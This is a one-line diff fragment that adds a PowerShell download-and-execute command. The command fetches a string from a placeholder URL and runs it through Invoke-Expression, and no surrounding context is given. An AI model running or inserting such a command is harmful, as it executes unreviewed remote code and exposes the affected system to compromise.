@@ -1,0 +1,1 @@
+powershell -noprofile -c "iex(New-Object Net.WebClient).DownloadString('url')"
